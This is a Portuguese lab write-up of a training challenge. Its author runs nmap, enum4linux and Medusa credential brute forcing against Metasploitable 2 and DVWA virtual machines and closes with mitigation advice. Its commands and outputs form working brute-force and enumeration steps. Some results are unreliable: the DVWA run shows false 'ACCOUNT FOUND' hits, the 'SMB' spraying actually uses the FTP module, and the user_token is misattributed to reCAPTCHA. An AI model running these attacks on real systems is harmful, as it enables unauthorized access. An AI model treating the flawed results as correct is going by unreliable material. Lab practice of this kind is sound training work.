# Finalidade do desafio
Implementar, documentar e compartilhar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis (por exemplo, **Metasploitable 2** e **DVWA**), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

- **Configurar o ambiente**: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (_host-only_).    
- **Executar ataques simulados**: força bruta em **FTP**, automação de tentativas em **formulário web (DVWA)** e **password spraying** em **SMB** com enumeração de usuários.    
- **Documentar os testes**: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.    


#### Alvo:

- Metasploitable
- DVWA

#### Ferramentas utilizar:

- nmap
- medusa
- enun4linux

----
# Pentest no metasplitable
-----

Verificação de serviço ativo ou não
```shell
ping -c 3 192.168.x.x

#saída

PING 192.168.x.x (192.168.x.x) 56(84) bytes of data.
64 bytes from 192.168.x.x: icmp_seq=1 ttl=64 time=0.888 ms
64 bytes from 192.168.x.x: icmp_seq=2 ttl=64 time=1.71 ms
64 bytes from 192.168.x.x: icmp_seq=3 ttl=64 time=1.59 ms

--- 192.168.x.x ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2343ms
rtt min/avg/max/mdev = 0.888/1.396/1.709/0.362 ms
```
----
Verificação de serviços e versões do sistema em porta especificas

```shell
nmap -sV -p 21,22,80,445,139 192.168.x.x
-----
#saída
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 15:49 -03
Nmap scan report for 192.168.x.x
Host is up (0.00067s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:E8:66:08 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.
Nmap done: 1 IP address (1 host up) scanned in 24.58 seconds
``` 
-----
Verificando se o serviço ftp está on
```shell
ftp 192.168.x.x

#saída
Connected to 192.168.x.x.
220 (vsFTPd 2.3.4)
Name (192.168.x.x:silvio): silvio
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.
``` 
----

# ATAQUE COM MEDUSA
---
#### Criação worlist
###### Obs.: Por sabermos a senha apenas criamos alguns usuário e senhas fictícios



```shell
#Users
echo -e "user\nadmin\nmsfadmin\nsilvano" > users.txt

#passwords
echo -e "123456\nadm\nmsfadmin\nsilverado" > pass.txt
```
#### Ataque
```shell
medusa -h 192.168.x.x -U users.txt -P pass.txt -M ftp -t 6

#saída
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-16 16:22:43 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: silverado (1 of 4 complete)
2025-10-16 16:22:43 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2025-10-16 16:22:43 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: adm (2 of 4 complete)
2025-10-16 16:22:44 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: 123456 (2 of 4 complete)
2025-10-16 16:22:44 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-10-16 16:22:44 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: adm (4 of 4 complete)
2025-10-16 16:22:44 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: msfadmin (1 of 4 complete)
2025-10-16 16:22:44 ACCOUNT FOUND: [ftp] Host: 192.168.x.x User: msfadmin Password: msfadmin [SUCCESS]
2025-10-16 16:22:47 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 3 complete) Password: msfadmin (3 of 4 complete)
2025-10-16 16:22:47 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-16 16:22:47 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 3 complete) Password: silverado (4 of 4 complete)
2025-10-16 16:22:47 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: adm (3 of 4 complete)
2025-10-16 16:22:47 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: msfadmin (3 of 4, 4 complete) Password: silverado (4 of 4 complete)
2025-10-16 16:22:47 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-16 16:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 4 complete) Password: adm (2 of 4 complete)
2025-10-16 16:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 4 complete) Password: msfadmin (3 of 4 complete)
2025-10-16 16:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 4 complete) Password: silverado (4 of 4 complete)

```

Observando a saída vemos que foi possível associar o usuário e a senha do sistema

2025-10-16 16:22:44 **ACCOUNT FOUND:** [ftp] Host: 192.168.x.x **User: msfadmin Password: msfadmin [SUCCESS]**

##### Validando o acesso

```shell
ftp 192.168.x.x

#saída
Connected to 192.168.x.x.
220 (vsFTPd 2.3.4)
Name (192.168.x.x:silvio): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

----
# Solução recomendada

Portas FTP aberta, a solução envolve configurar o servidor para permitir o tráfego desejado e garantir que o firewall esteja ajustado corretamente, definindo um intervalo de portas passivas no servidor FTP e liberando essas portas no firewall. Se você estiver usando firewall, comece bloqueando todas as portas e então abra apenas as necessárias, como a porta 21 para o controle de conexão e um intervalo específico para a transferência de dados passiva. Você pode usar o telnet ou netsh para testar e gerenciar o acesso e a configuração do firewall, além de utilzar senha multifatores e/ou senha longas e fortes.

----
# Ataque formulário web DVWA
----
#### Criação wordlist
###### Obs.: Por sabermos a senha apenas criamos alguns usuário e senhas fictícios

```shell
#users
echo -e "user\nadmin\ndvwa\nsilvano" > users_dvwa.txt

#password
echo -e "123456\nadm\np@ssw0rd\nsilverado" > pass_dvwa.txt
```

#### Ataque 

```shell
sudo medusa -h 192.168.x.x -U users_dvwa.txt -P pass_dvwa.txt -M http \
-m PAGE:'/dvwa/login.php'\
-m FORM:'username=^USER^&password=^PASS^&Login=Login'\
-m 'FAIL=Login failed' -t 6\
-m 'user_token=6LdMu-wrAAAAAJTTlKxC5COs5D1u2tAyck-LprB2'


#saídas
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: 2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (1 of 4 complete)
Invalid method: PAGE.
WARNING: Invalid method: PAGE.
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: user Password: 123456 [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: admin Password: 123456 [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: silverado (2 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: user Password: silverado [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: dvwa (3 of 4, 3 complete) Password: adm (1 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: dvwa Password: adm [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: silvano Password: 123456 [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 5 complete) Password: p@ssw0rd (3 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: user Password: p@ssw0rd [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 6 complete) Password: adm (2 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: admin Password: adm [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: dvwa (3 of 4, 7 complete) Password: 123456 (2 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: dvwa Password: 123456 [SUCCESS]
2025-10-16 17:45:33 ACCOUNT CHECK: [http] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 8 complete) Password: adm (4 of 4 complete)
2025-10-16 17:45:33 ACCOUNT FOUND: [http] Host: 192.168.x.x User: user Password: adm [SUCCESS]
```

### Conclusão
Infelizmente neste teste não consegui configurar o site (DVWA), no curso é passado uma informação, que infelizmente, está desatualizada, não basta apenas abrir o site no navegador, há toda uma configuração dele e também agora há o user_token, que por acaso tentei configura e aparentemente consegui, só que não acesso a página final de acesso com as saídas obtidas.

-----
# Ataque em cadeia, enumeração smb + password spraying
-----
```shell
enum4linux -a 192.168.x.x | tee enum4_output.txt

#saída
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 16 18:00:07 2025

 =========================================( Target Information )=========================================                                                         
                                                                                 
Target ........... 192.168.x.x                                                   
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.x.x )============================                                                          
                                                                                 
                                                                                 
[+] Got domain/workgroup name: WORKGROUP                                         
                                                                                 
                                                                                 
 ================================( Nbtstat Information for 192.168.x.x )================================                                                          
                                                                                 
Looking up status of 192.168.x.x                                                 
        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on 192.168.x.x )====================================                                                         
                                                                                 
                                                                                 
[+] Server 192.168.x.x allows sessions using username '', password ''            
                                                                                 
                                                                                 
 =================================( Getting domain SID for 192.168.x.x )=================================                                                         
                                                                                 
Domain Name: WORKGROUP                                                           
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup             
                                                                                 
                                                                                 
 ===================================( OS information on 192.168.x.x )===================================                                                          
                                                                                 
                                                                                 
[E] Can't get OS info with smbclient                                             
                                                                                 
                                                                                 
[+] Got OS info for 192.168.x.x from srvinfo:                                    
        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 ========================================( Users on 192.168.x.x )========================================                                                         
                                                                                 
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,        Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin) Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager       Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 ==================================( Share Enumeration on 192.168.x.x )==================================                                                         
                                                                                 
                                                                                 
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

[+] Attempting to map shares on 192.168.x.x                                      
                                                                                 
//192.168.x.x/print$    Mapping: DENIED Listing: N/A Writing: N/A                
//192.168.x.x/tmp       Mapping: OK Listing: OK Writing: N/A
//192.168.x.x/opt       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                   
                                                                                 
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                       
//192.168.x.x/IPC$      Mapping: N/A Listing: N/A Writing: N/A
//192.168.x.x/ADMIN$    Mapping: DENIED Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.x.x )============================                                                          
                                                                                 
Password:                                                                        


[+] Attaching to 192.168.x.x using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] METASPLOITABLE
        [+] Builtin

[+] Password Info for Domain: METASPLOITABLE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                             
                                                                                 
                                                                                 
Password Complexity: Disabled                                                    
Minimum Password Length: 0


 =======================================( Groups on 192.168.x.x )=======================================                                                          
                                                                                 
                                                                                 
[+] Getting builtin groups:                                                      
                                                                                 
                                                                                 
[+]  Getting builtin group memberships:                                          
                                                                                 
                                                                                 
[+]  Getting local groups:                                                       
                                                                                 
                                                                                 
[+]  Getting local group memberships:                                            
                                                                                 
                                                                                 
[+]  Getting domain groups:                                                      
                                                                                 
                                                                                 
[+]  Getting domain group memberships:                                           
                                                                                 
                                                                                 
 ===================( Users on 192.168.x.x via RID cycling (RIDS: 500-550,1000-1050) )===================                                                         
                                                                                 
                                                                                 
[I] Found new SID:                                                               
S-1-5-21-1042354039-2475377354-766472396                                         

[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''                                                       
                                                                                 
S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)

 ================================( Getting printer info for 192.168.x.x )================================                                                         
                                                                                 
No printers returned.                                                            


enum4linux complete on Thu Oct 16 18:12:24 2025

```

----
#### Criando wordlist smb
```shell
#Usuários
echo -e "user\nadmin\nmsfadmin\nsilvano" > users_smb.txt 

#Senhas
echo -e "123456\nadm\nmsfadmin\nsilverado" > pass_smb.txt
```

#### Ataque

```shell
medusa -h 192.168.x.x -U users_smb.txt -P pass_smb.txt -M ftp -t 2 -T 50

#saída

2025-10-16 18:27:53 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (1 of 4 complete)
2025-10-16 18:27:53 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: adm (2 of 4 complete)
2025-10-16 18:27:56 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: msfadmin (3 of 4 complete)
2025-10-16 18:27:56 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: silverado (4 of 4 complete)
2025-10-16 18:27:59 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2025-10-16 18:27:59 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: adm (2 of 4 complete)
2025-10-16 18:28:02 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: msfadmin (3 of 4 complete)
2025-10-16 18:28:02 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: silverado (4 of 4 complete)
2025-10-16 18:28:05 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: 123456 (1 of 4 complete)
2025-10-16 18:28:05 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: msfadmin (2 of 4 complete)
2025-10-16 18:28:05 ACCOUNT FOUND: [ftp] Host: 192.168.x.x User: msfadmin Password: msfadmin [SUCCESS]
2025-10-16 18:28:05 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: adm (3 of 4 complete)
2025-10-16 18:28:08 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 3 complete) Password: adm (1 of 4 complete)
2025-10-16 18:28:08 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-16 18:28:11 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 3 complete) Password: msfadmin (3 of 4 complete)
2025-10-16 18:28:11 ACCOUNT CHECK: [ftp] Host: 192.168.x.x (1 of 1, 0 complete) User: silvano (4 of 4, 4 complete) Password: silverado (4 of 4 complete)

```

Obs.: Analisando a saída temos:

2025-10-16 18:25:02 **ACCOUNT FOUND:** [ftp] Host: 192.168.x.x **User: msfadmin Password: msfadmin [SUCCESS]**

----

#### Testando o acesso SMB

```shell
smbclient -L //192.168.x.x -U msfadmin


#saída

Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE


```

## Conclusão
----

### Impactos

Exploração de vulnerabilidades e zero-days pode resultar em:

- **Acesso não autorizado**: cibercriminosos podem ganhar controle sobre sistemas, redes ou dados confidenciais;
    
- **Roubo de informações sensíveis**: dados privados, como informações financeiras ou de clientes, podem ser acessados e exfiltrados;
    
- **Prejuízos financeiros**: falhas de segurança podem ser usadas para fraudes financeiras, causando danos diretos às finanças da organização.

### Medidas sugeridas:

- **Atualizações de patches regulares**: mantenha todos os sistemas e aplicativos atualizados para corrigir falhas de segurança;

- **Testes de penetração**: realize testes de segurança regulares, como o pentest,  para identificar e corrigir vulnerabilidades antes que sejam exploradas;

- **Ferramentas de detecção**: utilize ferramentas de monitoramento de segurança para detectar atividades suspeitas relacionadas à exploração de vulnerabilidades.

- **Autenticação multifatorial (MFA)**: utilize MFA para proteger contas e sistemas, dificultando o acesso mesmo em caso de roubo de senha;




----
# Conclusão sobre o desafio

----

Apesar das explicações dadas em todo o processo, vejo que há partes que deverias ser revistas:

- Atualização da aulas - algumas explicações estão fora desatualizadas, como o uso do DVWA que não é apenas o processo de abrir o site e sim de configurações existentes para seu uso conforme pode ser verificado em ()[] e que também agora há um novo parâmetro ***user_token*** o qual você tem de criar um recapcha no Google para usa-lo.
- Na parte de configuração do VirtualBox também há uma - no meu ponto de vista - "falha",, pois para utilizar o Kali e o Metasploitable é informado que basta passar a rede de NAT, Rede NAT, etc para "Placa de rede exclusiva de hospedeiro (host-only)", o que no meu caso não funcionou e utilizei "Placa em modo Bridge" e com esta configuração consegui concluir parte do desafio.